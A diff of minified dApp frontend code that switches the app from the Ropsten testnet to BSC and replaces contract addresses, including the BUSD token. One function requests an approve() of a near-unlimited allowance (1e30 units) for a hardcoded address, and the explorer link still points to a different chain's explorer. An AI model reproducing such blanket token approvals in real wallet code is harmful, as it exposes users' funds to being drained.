@@ -74,9 +74,9 @@
 						package: v.a,
 						options: {
 							rpc: {
-								3: "https://ropsten.infura.io/v3/"
+								56: "https://bsc-dataseed.binance.org/"
 							},
-							network: "Ropsten"
+							network: "BSC"
 						}
 					}
 				},
@@ -367,9 +367,9 @@
 			}
 			var K = n(408),
 				N = n(409),
-				q = 3,
-				X = "0xA909f2adC3229d8ab7F740170Fa0860b1cC089f8",
-				_ = "https://evm.sherpax.io/address/0x99eF0e29700797A92Bc500A3a87fCB8c473A8e93",
+				q = 56,
+				X = "0x887b8dec8139CB604aaAae86cD00BB8073f1D694",
+				_ = "https://evm.sherpax.io/address/0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56",
 				$ = Object(a.createContext)({
 					busdcontract: null,
 					contract: null,
@@ -420,7 +420,7 @@
 					}), [p]);
 					var j = new g.a;
 					j.setProvider(g.a.givenProvider);
-					var x = new j.eth.Contract(K, "0x99eF0e29700797A92Bc500A3a87fCB8c473A8e93");
+					var x = new j.eth.Contract(K, "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56");
 					return Object(C.jsx)($.Provider, {
 						value: {
 							web3: u,
@@ -651,7 +651,7 @@
 							return A.a.wrap((function(e) {
 								for (;;) switch (e.prev = e.next) {
 									case 0:
-										return L(!0), "0xA909f2adC3229d8ab7F740170Fa0860b1cC089f8", e.prev = 2, e.next = 5, t.methods.approve("0xA909f2adC3229d8ab7F740170Fa0860b1cC089f8", "1000000000000000000000000000000").send({
+										return L(!0), "0x887b8dec8139CB604aaAae86cD00BB8073f1D694", e.prev = 2, e.next = 5, t.methods.approve("0x887b8dec8139CB604aaAae86cD00BB8073f1D694", "1000000000000000000000000000000").send({
 											from: b   
 										}); 
 									case 5:
